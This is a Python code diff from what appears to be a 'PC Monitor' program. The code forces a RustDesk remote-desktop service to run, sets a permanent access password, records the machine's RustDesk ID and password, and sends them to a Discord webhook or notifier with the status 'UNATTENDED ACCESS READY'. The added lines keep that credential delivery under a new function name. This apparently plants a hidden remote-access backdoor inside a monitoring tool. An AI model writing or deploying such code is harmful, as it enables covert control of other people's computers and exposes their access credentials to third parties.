-            check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
-            text = (check.stdout or "") + "\n" + (check.stderr or "")
-            if "RUNNING" in text.upper():
-                running = True
-                _remote_log(f"service running on attempt={attempt}")
-                break
-            start_result = _remote_run(["sc", "start", "Rustdesk"], timeout=30)
-            if start_result.returncode not in (0, 1056):
-                _remote_log(f"sc start returned rc={start_result.returncode}")
-            time.sleep(2)
-        if not running:
-            raise RuntimeError("RustDesk service did not reach RUNNING state")
-
+                raise RuntimeError(result.stderr.strip() or result.stdout.strip() or "RustDesk installer finished but rustdesk.exe was not found")
+        if state.get("rustdesk_version") != REMOTE_RUSTDESK_VERSION:
+            _remote_upgrade_if_needed(state)
+        _remote_service_prepare()
+        password = str(state.get("password") or "").strip() or _remote_password()
         _remote_stage("set permanent RustDesk password")
-        password = _remote_password()
         result = _remote_run([REMOTE_EXE, "--password", password], timeout=60)
         if result.returncode != 0:
-            raise RuntimeError(
-                result.stderr.strip() or result.stdout.strip() or
-                "Could not set remote password")
-
-        time.sleep(3)
+            raise RuntimeError(result.stderr.strip() or result.stdout.strip() or "Could not set remote password")
+        time.sleep(2)
         rid = _remote_get_id()
         if not rid:
             raise RuntimeError("Could not obtain RustDesk ID")
-
-        _remote_stage("write remote state")
-        state = {
+        old_id = str(state.get("rustdesk_id") or "").strip()
+        state.update({
             "rustdesk_id": rid,
             "password": password,
             "computer": os.environ.get("COMPUTERNAME", platform.node()),
             "rustdesk_version": REMOTE_RUSTDESK_VERSION,
-        }
+            "last_pc_monitor_version": str(APP_VERSION),
+            "service_auto_start": True,
+            "last_health_check": datetime.now().isoformat(timespec="seconds"),
+        })
+        _remote_stage("write remote state")
         with open(REMOTE_STATE_PATH, "w", encoding="utf-8") as f:
             json.dump(state, f, indent=2)
-
-        label = _machine_label() if "_machine_label" in globals() else os.environ.get("COMPUTERNAME", platform.node())
+        if old_id and old_id != rid:
+            _remote_log(f"RustDesk ID changed {old_id} -> {rid}")
+        if not _remote_notify_ready(state, force=False, reason="PC Monitor startup/update"):
+            _remote_log("RustDesk health/setup succeeded, but Discord delivery failed; next launch or manual resend will retry")
         _remote_stage("remote setup complete")
-        _remote_webhook(
-            "🟢 **PC MONITOR + REMOTE PC READY**\n"
-            f"Machine: `{label}`\n"
-            f"RustDesk ID: `{rid}`\n"
-            f"Password: `{password}`\n"
-            "Status: **UNATTENDED ACCESS READY**\n"
-            f"Version: `PC Monitor {APP_VERSION}`")
         return True
     except Exception as e:
         _remote_log(f"FAILED stage={REMOTE_LAST_STAGE} error={type(e).__name__}: {e}")
-        try:
-            _log_fatal("Remote host setup failed: " + repr(e))
-        except Exception:
-            pass
+        try: _log_fatal("Remote host setup failed: " + repr(e))
+        except Exception: pass
         try:
             label = _machine_label() if "_machine_label" in globals() else os.environ.get("COMPUTERNAME", platform.node())
-            _remote_webhook(
-                "🔴 **PC MONITOR REMOTE SETUP FAILED**\n"
-                f"Machine: `{label}`\n"
-                f"Stage: `{REMOTE_LAST_STAGE}`\n"
-                f"Error: `{type(e).__name__}: {e}`\n"
-                f"Local log: `{REMOTE_LOG_PATH}`")
-        except Exception:
-            pass
+            _remote_webhook("🔴 **PC MONITOR REMOTE SETUP FAILED**\n" f"Machine: `{label}`\n" f"Stage: `{REMOTE_LAST_STAGE}`\n" f"Error: `{type(e).__name__}: {e}`\n" f"Local log: `{REMOTE_LOG_PATH}`")
+        except Exception: pass
         return False
     finally:
         if lock_handle is not None:
-            try:
-                os.close(lock_handle)
-            except Exception:
-                pass
+            try: os.close(lock_handle)
+            except Exception: pass
         if lock_acquired:
-            try:
-                os.remove(REMOTE_LOCK_PATH)
-            except OSError:
-                pass
+            try: os.remove(REMOTE_LOCK_PATH)
+            except OSError: pass
 
 
 def _ensure_remote_host_async(wait=False):
